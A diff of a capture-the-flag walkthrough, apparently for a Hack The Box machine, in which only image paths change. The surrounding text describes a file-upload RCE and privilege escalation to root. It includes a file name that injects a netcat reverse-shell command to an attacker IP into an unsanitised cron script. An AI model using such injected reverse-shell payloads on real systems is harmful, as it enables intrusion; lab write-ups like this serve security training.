@@ -4,13 +4,13 @@
 
 Nmap scan:
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### File Upload RCE
 
 First, we can use `gobuster` on the website:
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>
 
 The `/backup` directory would show us a directory with a backup file:
 
@@ -96,7 +96,7 @@ The crontab specifies that the user is running the `check_attack` script routine
 
 One dangerous part of this script is the usage of `exec` to run stuff. The `$value` variable is not sanitised, and we can exploit this by creating a file with the name of `; nc 10.10.16.5 4444 -c bash` within the `/var/www/html/uploads` directory. After doing this and waiting, we would gain a reverse shell and can capture the user flag:
 
-<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (28) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### To Root
 
@@ -114,6 +114,6 @@ This takes user input and executes does not sanitise it at all. When we run the 
 
 To get a `root` shell, we just need to run `/bin/bash`:
 
-<figure><img src="../../../.gitbook/assets/image (23) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (2) (4).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
